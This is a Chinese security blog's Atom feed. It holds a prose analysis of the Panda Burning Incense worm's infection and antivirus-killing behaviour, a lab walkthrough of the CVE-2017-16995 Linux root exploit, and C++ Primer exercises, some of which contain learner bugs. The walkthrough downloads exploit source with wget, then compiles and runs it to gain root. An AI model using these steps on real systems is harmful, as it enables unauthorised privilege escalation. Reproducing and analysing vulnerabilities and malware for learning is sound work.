<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>findream&#39;s blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2018-03-25T06:26:45.670Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>findream</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>病毒分析技术(6) ---熊猫烧香</title>
    <link href="http://yoursite.com/2018/03/25/%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%80%E6%9C%AF(6)--%E7%86%8A%E7%8C%AB%E7%83%A7%E9%A6%99%E7%97%85%E6%AF%92/"/>
    <id>http://yoursite.com/2018/03/25/病毒分析技术(6)--熊猫烧香病毒/</id>
    <published>2018-03-25T06:02:11.000Z</published>
    <updated>2018-03-25T06:26:45.670Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一：目录"><a href="#一：目录" class="headerlink" title="一：目录"></a>一：目录</h1><ul><li>1.样本信息</li><li>2.行为分析</li><li>3.样本分析</li><li>4.详细分析<a id="more"></a><h1 id="二：样本分析"><a href="#二：样本分析" class="headerlink" title="二：样本分析"></a>二：样本分析</h1></li><li>1）病毒名称：panda.exe</li><li>2) MD5:3520D3565273E41C9EEB04675D05DCA8</li><li>3) 编译器：delphi</li><li>4）是否加壳：无</li></ul><h1 id="三：行为分析："><a href="#三：行为分析：" class="headerlink" title="三：行为分析："></a>三：行为分析：</h1><ul><li>1）经过两次自校验</li><li>2）判断程序是样本程序，还是被感染程序，还是被隐藏的程序</li><li>3）感染PE文件，WEB文件</li><li>4）设置定时器，结束防御软件进程</li><li>5）利用U盘和网络进行机器间传播</li></ul><h1 id="四：详细分析："><a href="#四：详细分析：" class="headerlink" title="四：详细分析："></a>四：详细分析：</h1><ul><li>1）病毒首先进过两次字验证，来验证自身。<br>   <img src="https://i.imgur.com/qAsM8Ja.png" alt=""></li><li>2）当病毒成功认证完后，跳转到40D173，执行4082F8，获取文件当前目录，查找desktop.ini文件，如果存在，则删除该文件<br>   <img src="https://i.imgur.com/1hWLBcr.png" alt=""></li><li>3）比较进程名是否是C;/WINDOWS/SYSTEM/DIRVER/SPCOLSV，如果是则进行4，否则进行5</li><li>4）查找spcolsv.exe并结束该进程。然后获取/WINDOWS/SYSTEM/DIRVER/SPCOLSV，将病毒本体拷贝到该目录，并且以该目录为参数，启动程序，结束样本进程，实现病毒的隐藏。<br>  <img src="https://i.imgur.com/Os2I7TR.png" alt=""><br>  <img src="https://i.imgur.com/p6E1i8s.png" alt=""></li><li>5）<strong>判断是否为被感染的程序，执行可以自己删除的批处理文件，重复执行4）的操作</strong></li><li>6）执行感染行为<br>  <img src="https://i.imgur.com/7JTZWOv.png" alt=""><br>  <img src="https://i.imgur.com/bfmP9Go.png" alt=""></li><li>7）病毒实现自我保护<br>  <img src="https://i.imgur.com/lBVRRzr.png" alt=""></li><li>8）破坏防病毒软件，结束其进程<br>  <img src="https://i.imgur.com/u69RtFp.png" alt=""></li></ul><h1 id="五：感悟"><a href="#五：感悟" class="headerlink" title="五：感悟"></a>五：感悟</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;病毒没有采用很高深的对抗和隐藏技术，这个病毒分析困难在他把关键的API调用隐藏在函数的嵌套中，不容易看出来，如果直接用导入表为切入口可能会很好解决。</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;一：目录&quot;&gt;&lt;a href=&quot;#一：目录&quot; class=&quot;headerlink&quot; title=&quot;一：目录&quot;&gt;&lt;/a&gt;一：目录&lt;/h1&gt;&lt;ul&gt;
&lt;li&gt;1.样本信息&lt;/li&gt;
&lt;li&gt;2.行为分析&lt;/li&gt;
&lt;li&gt;3.样本分析&lt;/li&gt;
&lt;li&gt;4.详细分析
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>CVE-2017-16995本地提权漏洞复现</title>
    <link href="http://yoursite.com/2018/03/23/CVE-2017-16995%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://yoursite.com/2018/03/23/CVE-2017-16995本地提权漏洞复现/</id>
    <published>2018-03-23T09:02:11.000Z</published>
    <updated>2018-03-23T05:58:30.401Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-漏洞概述"><a href="#1-漏洞概述" class="headerlink" title="1.漏洞概述"></a>1.漏洞概述</h1><p>Ubuntu最新版本16.04存在本地提权漏洞，该漏洞存在于Linux内核带有的eBPF bpf(2)系统调用中，当用户提供恶意BPF程序使eBPF验证器模块产生计算错误，导致任意内存读写问题。 </p><p>攻击者（普通用户）可以利用该漏洞进行提权攻击，获取root权限，危害极大。该漏洞编号是CVE-2017-16995，在之前的一些老版本已经修复了，但是在最新的Ubuntu版本中，又出现了这个漏洞，并且Twitter爆出了漏洞利用代码……</p><p>目前，主要是Debian和Ubuntu版本受影响，Redhat和CentOS不受影响。</p><p>影响版本：<br>Linux内核：Linux Kernel Version 4.14 ~ 4.4<br>Ubuntu版本：16.04.01~ 16.04.04<br><a id="more"></a></p><h1 id="2-复现过程"><a href="#2-复现过程" class="headerlink" title="2.复现过程"></a>2.复现过程</h1><ul><li><p>1）查看Ubuntu版本，Ubuntu16.04</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">lsb_release -<span class="keyword">a</span></div></pre></td></tr></table></figure><p>  <img src="https://i.imgur.com/LJRX3Bg.png" alt=""></p></li><li><p>2) 查看本地用户组权限,系统处于用户登录状态</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">id</span></div></pre></td></tr></table></figure><p>  <img src="https://i.imgur.com/ulpa44S.png" alt=""></p></li><li><p>3）下载PWN代码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">wget  http:<span class="regexp">//</span>cyseclabs.com<span class="regexp">/pub/u</span>pstream44.c</div></pre></td></tr></table></figure></li><li><p>4) 安装gcc编译器</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo apt <span class="keyword">install</span> gcc</div></pre></td></tr></table></figure></li><li><p>5) 编译.C源文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">gcc -o <span class="built_in">test</span> upstream44.c</div></pre></td></tr></table></figure></li><li><p>6) 赋予可执行权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">chmod +x <span class="built_in">test</span></div></pre></td></tr></table></figure></li><li><p>7) 查看刚刚操作是否成功生成test文件</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">ll</span></div></pre></td></tr></table></figure></li><li><p>8) 执行刚刚编译出来的文件,发现程序执行了本地提权操作（没有经过密码认证从而获取管理员权限）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">./<span class="built_in">test</span></div></pre></td></tr></table></figure><p>  <img src="https://i.imgur.com/HpdwJrB.png" alt=""></p></li></ul><h1 id="3-原理分析"><a href="#3-原理分析" class="headerlink" title="3.原理分析"></a>3.原理分析</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;该漏洞发生的具体原因是：在linux内核中的kernel/bpf/verifier.c中的check_alu_op函数通过4.14.8允许本地用户通过利用不正确的符号扩展来导致拒绝服务（内存损坏）或可能具有未指定的其他影响。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eBPF可用于内核调试和跟踪，网络事件的过滤，其一般机制是：  </p><ul><li>1）用户空间将一个特殊的汇编字节码加载到内核，并且说明附加程序的位置  </li><li>2) 内核运行一个BSP验证器来证明程序是安全的  </li><li>3）内核将字节码转化为本地代码，并将其附加到请求的位置。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;eBPF验证器会检查eBPF程序是否符合某些要求：  </li><li>1）它限制了字节码指令的数量  </li><li>2）循环被禁止  </li><li>3）确保没有不可达的说明  </li><li>4）确保没有跳出界限  </li><li>5）确保只有授权区域才能访问内存  </li><li>6）等等。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;如果验证者通过了一个恶意程序，它会使整个系统面临很大的风险，这是由于eBPF在内核中运行的事实 - 将本该安全执行的内容转变为内核中的任意代码执行。具体来说，在这种情况下，验证者无法验证对内存的访问权限，从而允许读写任意内核地址！  </li></ul><h1 id="4-参考文献"><a href="#4-参考文献" class="headerlink" title="4.参考文献"></a>4.参考文献</h1><p><a href="https://mp.weixin.qq.com/s/h_5LzJafkOJCcLqQAcIuHQ" target="_blank" rel="external">https://mp.weixin.qq.com/s/h_5LzJafkOJCcLqQAcIuHQ</a><br><a href="https://blog.csdn.net/zhao_cancan/article/details/38366541" target="_blank" rel="external">https://blog.csdn.net/zhao_cancan/article/details/38366541</a><br><a href="https://blog.csdn.net/bai___ddd/article/details/79105754" target="_blank" rel="external">https://blog.csdn.net/bai___ddd/article/details/79105754</a><br><a href="https://blog.aquasec.com/ebpf-vulnerability-cve-2017-16995-when-the-doorman-becomes-the-backdoor?spm=a2c4e.11155515.0.0.p3m7Ql&amp;utmcampaign=General%20website&amp;utmcontent=67375488&amp;utmmedium=social&amp;utmsource=twitter" target="_blank" rel="external">https://blog.aquasec.com/ebpf-vulnerability-cve-2017-16995-when-the-doorman-becomes-the-backdoor?spm=a2c4e.11155515.0.0.p3m7Ql&amp;utmcampaign=General%20website&amp;utmcontent=67375488&amp;utmmedium=social&amp;utmsource=twitter</a>  </p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;1-漏洞概述&quot;&gt;&lt;a href=&quot;#1-漏洞概述&quot; class=&quot;headerlink&quot; title=&quot;1.漏洞概述&quot;&gt;&lt;/a&gt;1.漏洞概述&lt;/h1&gt;&lt;p&gt;Ubuntu最新版本16.04存在本地提权漏洞，该漏洞存在于Linux内核带有的eBPF bpf(2)系统调用中，当用户提供恶意BPF程序使eBPF验证器模块产生计算错误，导致任意内存读写问题。 &lt;/p&gt;
&lt;p&gt;攻击者（普通用户）可以利用该漏洞进行提权攻击，获取root权限，危害极大。该漏洞编号是CVE-2017-16995，在之前的一些老版本已经修复了，但是在最新的Ubuntu版本中，又出现了这个漏洞，并且Twitter爆出了漏洞利用代码……&lt;/p&gt;
&lt;p&gt;目前，主要是Debian和Ubuntu版本受影响，Redhat和CentOS不受影响。&lt;/p&gt;
&lt;p&gt;影响版本：&lt;br&gt;Linux内核：Linux Kernel Version 4.14 ~ 4.4&lt;br&gt;Ubuntu版本：16.04.01~ 16.04.04&lt;br&gt;
    
    </summary>
    
      <category term="安全" scheme="http://yoursite.com/categories/%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>C++Primer 第三章：字符串，向量，数组</title>
    <link href="http://yoursite.com/2018/03/22/C++%E5%AD%A6%E4%B9%A0%E7%AC%AC%E4%BA%8C%E7%AB%A0/"/>
    <id>http://yoursite.com/2018/03/22/C++学习第二章/</id>
    <published>2018-03-22T07:02:11.000Z</published>
    <updated>2018-03-28T00:23:32.561Z</updated>
    
    <content type="html"><![CDATA[<h2 id="3-3：标准库类型-vector"><a href="#3-3：标准库类型-vector" class="headerlink" title="3.3：标准库类型 vector"></a>3.3：标准库类型 vector</h2><h3 id="定义和初始化vector"><a href="#定义和初始化vector" class="headerlink" title="定义和初始化vector"></a>定义和初始化vector</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;标准库类型vector表示对象的集合，其中所有对象的类型都相同，vector中容纳着其他对象，所以被称为容器。类似于c语言中的动态数组。  </p><ul><li>1）引用不能成为vector的元素，因为引用不是对象（引用只是对象的别名）  </li><li>2）可以使用花括号初始化每个值  </li><li>3）使用括号指定元素个数或者相同元素值  </li><li>4）根据类型编译器会决断括号内部含有的信息：vector <string> v7{10}   //V7有10个默认值  </string></li><li>5) 初始化不准用赋值表达式  <a id="more"></a><h3 id="向vector里面添加元素"><a href="#向vector里面添加元素" class="headerlink" title="向vector里面添加元素"></a>向vector里面添加元素</h3>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;使用vector.push_back()向里面添加对象。  </li><li>练习3.14：<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> num;</div><div class="line"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; vector_num;</div><div class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; num)</div><div class="line">&#123;</div><div class="line">vector_num.push_back(num);</div><div class="line">&#125;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><hr><ul><li>练习3.15:<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="built_in">string</span> word;</div><div class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; vector_string;</div><div class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; word)</div><div class="line">&#123;</div><div class="line">vector_string.push_back(word);</div><div class="line">&#125;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><h3 id="其他vector操作"><a href="#其他vector操作" class="headerlink" title="其他vector操作"></a>其他vector操作</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其他几种vector操作  </p><ul><li>v.empty()  </li><li>v.size()  </li><li>v1=v2  </li><li>下标运算符可以用于访问已存在的元素，不能用于添加元素  <figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">for</span>(<span class="keyword">decltype</span>(ivec.<span class="built_in">size</span>()) ix=<span class="number">0</span>;ix!=<span class="number">10</span>;i++)</div><div class="line">&#123;</div><div class="line">ivec[ix]=ix;  <span class="comment">//严重错误</span></div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><hr><ul><li>练习3.16:  <figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="comment">//**需要注意的是里面的for关键字的用法**  </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="built_in">vector</span>&lt; <span class="keyword">int</span> &gt; v1;</div><div class="line"><span class="built_in">vector</span>&lt; <span class="keyword">int</span> &gt; v2(<span class="number">10</span>);</div><div class="line"><span class="built_in">vector</span>&lt; <span class="keyword">int</span> &gt; v3(<span class="number">10</span>,<span class="number">42</span>);</div><div class="line"><span class="built_in">vector</span>&lt; <span class="keyword">int</span> &gt; v4&#123;<span class="number">10</span>&#125;;</div><div class="line"><span class="built_in">vector</span>&lt; <span class="keyword">int</span> &gt; v5&#123;<span class="number">10</span>,<span class="number">42</span>&#125;;</div><div class="line"><span class="built_in">vector</span>&lt; <span class="built_in">string</span> &gt; v6&#123;<span class="number">10</span>&#125;;</div><div class="line"><span class="built_in">vector</span>&lt; <span class="built_in">string</span> &gt; v7&#123;<span class="number">10</span>,<span class="string">"hi"</span>&#125;;</div><div class="line"><span class="comment">//for (auto i : v2)</span></div><div class="line"><span class="comment">//cout &lt;&lt; i &lt;&lt; " ";</span></div><div class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i = <span class="number">0</span>; i &lt; v2.size(); i++)</div><div class="line"><span class="built_in">cout</span> &lt;&lt; v2[i] &lt;&lt; <span class="string">" "</span>;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><hr><ul><li>练习3.17：<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//    * vector里面存储的是string类型，string类型可以看做一个字符串，所以在内存中是以二维数组的形式存储的。  </span></div><div class="line"><span class="comment">//    * vector用**v.size()**来获取大小，string使用**s.length()**来获取长度。   </span></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="built_in">vector</span>&lt;<span class="built_in">string</span>&gt; My_vector;</div><div class="line"><span class="built_in">string</span> istring;</div><div class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; istring)</div><div class="line">&#123;</div><div class="line">My_vector.push_back(istring);</div><div class="line">&#125;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; My_vector.size(); i++)</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; My_vector[i].length(); j++)   <span class="comment">//重点My_vector中的string类型的长度</span></div><div class="line">&#123;</div><div class="line">My_vector[i][j] = <span class="built_in">toupper</span>(My_vector[i][j]);</div><div class="line">&#125;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; My_vector.size(); i++)</div><div class="line">&#123;</div><div class="line"><span class="built_in">cout</span> &lt;&lt; My_vector[i] &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">&#125;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><hr><ul><li>练习 3.20<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> num,j,i;</div><div class="line"><span class="built_in">vector</span>&lt; <span class="keyword">int</span> &gt; nums;</div><div class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; num)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (num == <span class="number">0</span>)</div><div class="line"><span class="keyword">break</span>;</div><div class="line">nums.push_back(num);</div><div class="line">&#125;</div><div class="line"><span class="keyword">for</span> (i = <span class="number">0</span>,j=nums.size()<span class="number">-1</span>; i &lt; nums.size()&amp;&amp;j&gt;=<span class="number">0</span>&amp;&amp;i&lt;=j; i++,j--)</div><div class="line">&#123;</div><div class="line"><span class="keyword">int</span> sum=<span class="number">0</span>;</div><div class="line"><span class="keyword">if</span> (i == j)</div><div class="line">sum = nums[i];</div><div class="line"><span class="keyword">else</span> <span class="keyword">if</span>(i &lt; j)</div><div class="line">sum = sum + nums[i] + nums[j];</div><div class="line"><span class="built_in">cout</span> &lt;&lt; sum &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">&#125;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><h2 id="3-4迭代器介绍"><a href="#3-4迭代器介绍" class="headerlink" title="3.4迭代器介绍"></a>3.4迭代器介绍</h2><h3 id="使用迭代器"><a href="#使用迭代器" class="headerlink" title="使用迭代器"></a>使用迭代器</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;获取迭代器不是使用取址指针，使用成员begin和成员end（）来返回第一个元素的迭代器和最后一个元素的迭代器。  </p><ul><li>*item           //返回迭代器item所指向元素的引用  </li><li>item-&gt;mem       //等价于（*item).mem  </li><li>++iter          //指向下一个元素<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;（<em>item).empty()和</em>item.empty()的区别在于前者是先对item解引用，然后在进行点运算符，后者是对item.empty（）成员解引用。后期，引进了箭头运算符，使得解引用和成员访问两个运算符结合在一起。即：item-&gt;empty()等价于（*item).empty()  </li><li>练习3.22：<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="built_in">string</span> word;</div><div class="line"><span class="built_in">vector</span> &lt;<span class="built_in">string</span>&gt; <span class="built_in">string</span>;</div><div class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; word)</div><div class="line"><span class="built_in">string</span>.push_back(word);</div><div class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">string</span>[<span class="number">1</span>].length(); i++)</div><div class="line">&#123;</div><div class="line"><span class="built_in">string</span>[<span class="number">1</span>][i] = <span class="built_in">toupper</span>(<span class="built_in">string</span>[<span class="number">1</span>][i]);</div><div class="line">&#125;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i = <span class="number">0</span>; i &lt; <span class="built_in">string</span>.size(); i++)</div><div class="line">&#123;</div><div class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">string</span>[i] &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">&#125;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><hr><ul><li>练习2.23：<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> num;</div><div class="line"><span class="built_in">vector</span> &lt;<span class="keyword">int</span> &gt; nums;</div><div class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; num)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (num == <span class="number">0</span>)</div><div class="line"><span class="keyword">break</span>;</div><div class="line">nums.push_back(num);</div><div class="line">&#125;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> item = nums.begin(); item != nums.end(); item++)</div><div class="line">&#123;</div><div class="line">*item *= <span class="number">2</span>;</div><div class="line"><span class="built_in">cout</span> &lt;&lt; *item;</div><div class="line">&#125;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div><div class="line">```   </div><div class="line"></div><div class="line">---</div><div class="line">* 练习<span class="number">3.24</span>：   </div><div class="line">``` </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> num;</div><div class="line"><span class="built_in">vector</span>&lt; <span class="keyword">int</span> &gt; nums;</div><div class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; num)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (num == <span class="number">0</span>)</div><div class="line"><span class="keyword">break</span>;</div><div class="line">nums.push_back(num);</div><div class="line">&#125;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> nums_begin=nums.begin(),nums_end=nums.end();nums_begin!=nums_end;nums_begin++)</div><div class="line">&#123;</div><div class="line"><span class="built_in">cout</span> &lt;&lt; *nums_begin + *nums_end &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">nums_end--;</div><div class="line">&#125;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></li></ul><hr><ul><li>练习3.25：利用偏移<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">int</span> num;</div><div class="line"><span class="built_in">vector</span>&lt; <span class="keyword">int</span> &gt; nums(<span class="number">11</span>,<span class="number">0</span>);</div><div class="line"><span class="keyword">while</span> (<span class="built_in">cin</span> &gt;&gt; num)</div><div class="line">&#123;</div><div class="line"><span class="keyword">if</span> (num &lt;= <span class="number">100</span>)</div><div class="line">&#123;</div><div class="line"><span class="keyword">auto</span> item = nums.begin();   <span class="comment">//给与基地址</span></div><div class="line"><span class="keyword">auto</span> x = num / <span class="number">10</span>;           <span class="comment">//偏移地址</span></div><div class="line">item += x;</div><div class="line">*(item)++;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i : nums)</div><div class="line">&#123;</div><div class="line"><span class="built_in">cout</span> &lt;&lt; i &lt;&lt; <span class="built_in">endl</span>;</div><div class="line">&#125;</div><div class="line">system(<span class="string">"pause"</span>);</div><div class="line"><span 